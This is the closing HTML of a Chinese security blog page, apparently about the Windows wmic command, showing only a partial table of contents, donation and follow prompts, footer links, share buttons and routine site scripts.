post-toc-level-3"><a class="post-toc-link" href="#datafile"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">datafile</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#fsdir-文件目录系统项目管理"><span class="post-toc-number">6.3.</span> <span class="post-toc-text">fsdir  - 文件目录系统项目管理</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#pagefileset"><span class="post-toc-number">6.4.</span> <span class="post-toc-text">pagefileset</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x06-远程操作"><span class="post-toc-number">7.</span> <span class="post-toc-text">0x06 远程操作</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#node"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">&#x2F;node</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#rdtoggle"><span class="post-toc-number">7.2.</span> <span class="post-toc-text">rdtoggle</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x07-namespace-名称空间"><span class="post-toc-number">8.</span> <span class="post-toc-text">0x07 namespace - 名称空间</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#1-root-securitycenter2"><span class="post-toc-number">8.1.</span> <span class="post-toc-text">(1) \root\securitycenter2</span></a></li></ol></li></ol>
            </nav>
            <div class="toc-bar"><div>
        </aside>
    


    <!-- 支付宝微信文章赞赏 -->
    
      <div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        如果此篇文章对您有帮助，就请作者喝杯 Coffee ☕️☕️!
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardwechat" src="/img/reward-wechat.jpg" height="250" height="250" alt="微信打赏二维码">
            <img id="rewardalipay" src="/img/reward-alipay.png" height="250" height="250" alt="支付宝打赏二维码">
        </div>
        
        <label class="reward-toggle">
            <!-- <input id="rewardToggle" type="checkbox" class="reward-toggle-check" data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.png"> -->
            <div class="reward-toggle-ctrol">
                <span class="reward-toggle-item wechat">微信</span>
                <span class="reward-toggle-item alipay">支付宝</span>
            </div>
        </label>
        
    </div>
</div>

      

    <!-- 微信公众号关注/文章版权复制 -->
    
      <div id="btw-mask" style="position: fixed; top: 0px; right: 0px; bottom: 0px; left: 0px; opacity: 0.7; z-index: 999; background: rgb(0, 0, 0); display:none"></div>
<div id="btw-modal" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 360px; text-align: center; font-size: 13px; background: rgb(255, 255, 255); border-radius: 10px; z-index: 9999; font-family: PingFangSC-Regular, sans-serif;display:none">
<span id="btw-modal-close-btn" style="position: absolute; top: 5px; right: 15px; line-height: 1.8; font-size: 15px; cursor: pointer; opacity: 0.2; z-index: 9999; color: rgb(0, 0, 0); background: none; border: none; outline: none;">X</span>
<p id="btw-modal-header" style="margin-top: 40px; line-height: 1.8; font-size: 13px; ">
<b style="color:#6190e8;">你好看友,欢迎关注博主微信公众号哟! ❤ <br> 这将是我持续更新文章的动力源泉，谢谢支持！(๑′ᴗ‵๑) </b> <br> 如不想关注请点击右上角的【X】即可关闭继续浏览文章.<br>  <b style="color:red;"> 温馨提示: 未解锁的用户不能粘贴复制文章内容哟!</b> <br>
<br>Method 1.Please visit <strong><a href="https://twitter.com/WeiyiGeek" target="_blank" rel="noopener" style="color: rgb(240, 65, 52);text-decoration:underline;">【My Twitter】</a></strong>. There is an article verification code in the homepage.
<br>方式2.请访问本博主的B站<strong><a href="https://space.bilibili.com/385802642" target="_blank" rel="noopener" style="color: rgb(240, 65, 52);text-decoration:underline;">【WeiyiGeek】</a></strong>首页关注UP主,<br>将自动随机获取解锁验证码。
<br>方式3.扫一扫下方二维码，关注本站<strong>官方公众号</strong><br>
回复：<strong style="color: rgb(240, 65, 52);">验证码</strong>
将获取<strong style="color: rgb(240, 65, 52);">解锁(有效期7天)</strong>本站所有技术文章哟!</p>
<img src="/img/wechat-search.png" style="width: 300px; margin-top: 10px;">
<div id="btw-modal-input-code" style="margin-top: 20px; background: rgb(255, 255, 255);">
  <input id="btw-modal-input" type="number" minlength="4" maxlength="4" placeholder="请输入验证码|Verification Code"
    style="width: 165px; height: 32px; line-height: 32px; padding: 0px 10px; margin: 0px 10px; font-size: 13px; text-rendering: auto; text-transform: none; cursor: text; outline: none; box-sizing: border-box; border: 1px solid rgb(221, 221, 221); -webkit-appearance: textfield; background-color: white; -webkit-rtl-ordering: logical;"/>
  <button id="btw-submit-btn" onclick="yzm_vertify()"
    style="padding: 0px 20px; height: 32px; font-size: 14px; outline: none; border: none; color: rgb(255, 255, 255); background: rgb(222, 104, 109); cursor: pointer;">提
    交</button> </div>
<p id="btw-footer" style="margin: 40px 0px 20px; color: rgb(153, 153, 153);">@WeiyiGeek - 为了能到远方，脚下的每一步都不能少</p>
</div>
        
</article>
</div>

    </main>
    <footer class="footer ">
    
    <div class="top">
        
            <p>
    <span>Links：</span>
    
    <span class="blogroll-item">
        <a href="https://weiyigeek.top" target="_blank">https://weiyigeek.top</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://blog.weiyigeek.top" target="_blank">https://blog.weiyigeek.top</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://weiyigeek.top/img/search-wechat.jpg" target="_blank">公众账号</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://space.bilibili.com/385802642/article" target="_blank">哔哩哔哩专栏</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://github.com/weiyigeek" target="_blank">博主Github</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://gitee.com/WeiyiGeek" target="_blank">博主Gitee</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.zhihu.com/people/weiyiSec" target="_blank">知乎</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.cnblogs.com/WeiyiGeek" target="_blank">博客园</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://my.oschina.net/weiyigeek" target="_blank">OSCHINA</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.toutiao.com/c/user/token/MS4wLjABAAAAqcPSoMqfctaEqJpGSF775eeCjWkrop4AOyLITdMx-L78F5iXzfQcSRM5sY4dq3wR" target="_blank">今日头条</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://blog.csdn.net/u013072756?type=lately" target="_blank">CSDN</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.jianshu.com/u/5199a1104739" target="_blank">简书</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://cloud.tencent.com/developer/user/1389665/articles" target="_blank">腾讯云社区</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://cuttlefish.baidu.com/shop/75c5dbd8d15abe23482f4d40" target="_blank">百度文库</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://author.baidu.com/home?from=blog&app_id=1726736601523415" target="_blank">IT极客知识分享</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://blog.51cto.com/weiyigeek" target="_blank">51CTO博客</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://juejin.cn/user/122767337595934" target="_blank">掘金</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://weibo.com/a/hot/7622022703618049_1.html" target="_blank">微博文章</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.xiaohongshu.com/user/profile/627c98bb000000001000e7ba" target="_blank">小红书</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://segmentfault.com/u/weiyigeek" target="_blank">Segmentfault</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.modb.pro/u/506690" target="_blank">墨天轮</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.douyin.com/user/MS4wLjABAAAAMSBdMja6XLsdmzafb0RNbFeBemIOk38K1PaOClZeI1Q" target="_blank">抖音主页</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.kuaishou.com/profile/3xfbrsrhd2i69x9" target="_blank">快手主页</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.ixigua.com/home/3984243135350727" target="_blank">西瓜视频</a>
    </span>
    
</p>

        
    </div>
    
    <div class="bottom">
      <p>
        <span>WeiyiGeek &copy; 2018 - 2022 <a href="https://weiyigeek.top" target="_blank" rel="noopener">weiyigeek.top</a> All rights reserved.唯一极客IT知识分享 版权所有 </span>
        
        <span>
          Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/weiyigeek" target="_blank">mellow</a>
        </span>
        
        <br/><a id="SiteRunTime"></a>
        <br/>访问统计
        <span><a href="/sitemap.xml" target="_blank" rel="Sitemaps-站点地图">Sitemaps</a> </span>
        <span><a href="/baidusitemap.xml" target="_blank" rel="baidusitemaps-百度站点地图">站点地图</a> </span>
        <!-- 
  -->
        <br/>ICP备案号<span><a href="https://beian.miit.gov.cn" target="_blank">渝ICP备2022003447号</a></span>
        <br/>
        <div id="cc-myssl-id">
          <a href="https://myssl.com/blog.weiyigeek.top?from=mysslid" target="_blank" rel="noopener">
            <img src="https://static.myssl.com/res/images/myssl-id1.png" alt="MySSL安全认证" style="max-height:50px;display:block;margin:0 auto">
          </a>
        </div>
      </p>
    </div>
</footer>



    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>


<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://blog.weiyigeek.top/2019/5-29-247.html&title=《wmic命令解析与实例》 — WeiyiGeek Blog&pic=https://blog.weiyigeek.top/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://blog.weiyigeek.top/2019/5-29-247.html&title=《wmic命令解析与实例》 — WeiyiGeek Blog&source=[TOC]" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.weiyigeek.top/2019/5-29-247.html" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《wmic命令解析与实例》 — WeiyiGeek Blog&url=https://blog.weiyigeek.top/2019/5-29-247.html&via=https://blog.weiyigeek.top" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://blog.weiyigeek.top/2019/5-29-247.html" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
      
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACMUlEQVR42u3aQW7DMAwFUd//0u42QBp5PqW0EDVaFW6i+GlBUCSvC6/7Zb0+Gf/3/fn7nuNfWbxkyJCxLeMervEPcMynV/+0D383GTJknMPgWxPA+CXSgyDBWoYMGTL4Z+ZDsAwZMmTMM8bpI78G/3PAlSFDxoYMcokln+eFNn40i+/iMmTI2JDBq+5///dX+hsyZMjYilELnWmaSELkPbFkyJDRm8EDHG9tpi+NLqhkBxkyZLRmkCGt9LI6g6k9kSFDRldGmszVmgHku2mz85cMV4YMGU0Zaajl42IzDUveAJAhQ4YMfr3kDUs+2MEPQoYMGecweEsgfc6TS44s9hZkyJDRgrGseveFZgBKDWXIkNGOkaZfJJiS8Jo2Eh72kSFDxgGMtBBPCmE8Aa1dpB9amDJkyGjESEMbH57gbB6Or9qZyZAhozWDJ3A8dPKWZ9r+lCFDRlcGH3dIS2/ByU0X3WTIkNGbwS+otfEvUm5Lr8pxJ1aGDBntGDzspqG5NopB8DJkyDiHUSuu8aDJE8d0TE2GDBnnMNJgV0PWDgW1OWXIkHEwYyYszhfggpKcDBkymjLucNUSu/nk8iH4ypAhozVj7ZxVOvLFv7UsZMuQIWNbxqrELi39p42EhzRRhgwZBzDSkhmP3PEL1XaTIUOGjEXJX21EAwViGTJkyCgV1Eig5Ennw24yZMg4gEEusengxUx4/WK5TYYMGRsypiY18CcJhieUxUamDBky9mP8AD9c0T8N1aZ1AAAAAElFTkSuQmCC" alt="微信分享二维码">
</div>


    
    <!-- main-js -->
<script type="text/javascript" src="/js/jquery/2.1.0-jquery.min.js?v=1.6.6"></script>
<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.6.6"></script>
<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.6.6"></script>
<script type="text/javascript" src="/js/jquery/3.5.2-jquery.fancybox.min.js?v=1.6.6"></script>
<!--  //cdn.bootcss.com/node-waves/0.7.4/waves.min.js -->
<script type="text/javascript" src="/js/node-waves/0.7.4-waves.min.js?v=1.6.6"></script> 

<script type="text/javascript" src="/js/method.js?v=1.6.6"></script>
<script type="text/javascript" src="/js/blog.js?v=1.6.6"></script>

<!-- third-party -->
<script type="text/javascript" src="/js/plugins/local_search.js?v=1.6.6"></script>
<script type="text/javascript">
	var search_path = "search.xml";
	if (search_path.length === 0) { search_path = "search.xml";}
	var path = "/" + search_path;
	searchFunc(path, "local-search-input", "local-search-result");
</script> 

    


<!-- <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script> --> 


  


<script>
  var _hmt = _hmt || [];
  (function() {
    // 百度统计
    var hm = document.createElement("script");
    hm.src = "https://hm.baidu.com/hm.js?53923c4b5560739bc0ed61e183be6acf";
    var s = document.getElementsByTagName("script")[0]; 
    s.parentNode.insertBefore(hm, s);
  })();
</script>
 


<!-- mathjax config similar to math.stackexchange -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
            processEscapes: true,
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.staticfile.org/mathjax/2.7.9/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
 
<script>
    (function() {
        var OriginTitile = document.title, titleTime;
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                document.title = 'WeiyiGeek Blog-关注于网络安全_物联网安全开发_网络安全运维-学习心得分享';
                clearTimeout(titleTime);
            } else {
                document.title = '(つェ⊂)咦!又好了!';
                titleTime = setTimeout(function() {
                    document.title = OriginTitile;
                },2000);
            }
        });
    })();
</script>
 

     <script type="text/javascript" src="/js/custom/copytips.js?v=1.6.6"></script> 
<script type="text/javascript">
// 站点运行时间
var BootDate = new Date("2018/01/01 00:00:00");
function ShowRunTime(id) {
  var NowDate = new Date();
  var RunDateM = parseInt(NowDate - BootDate);
  var RunDays = Math.floor(RunDateM/(24*3600*1000));
  var RunHours = Math.floor(RunDateM%(24*3600*1000)/(3600*1000));
  var RunMinutes = Math.floor(RunDateM%(24*3600*1000)%(3600*1000)/(60*1000));
  var RunSeconds = Math.round(RunDateM%(24*3600*1000)%(3600*1000)%(60*1000)/1000);
  var RunTime = RunDays + "天" + RunHours + "时" + RunMinutes + "分" + RunSeconds + "秒";
  document.getElementById(id).innerHTML = "网站已在风雨中勉勉强强运行了【" + RunTime + "】";
}
setInterval("ShowRunTime('SiteRunTime')", 1000);
</script>
</body>
</html>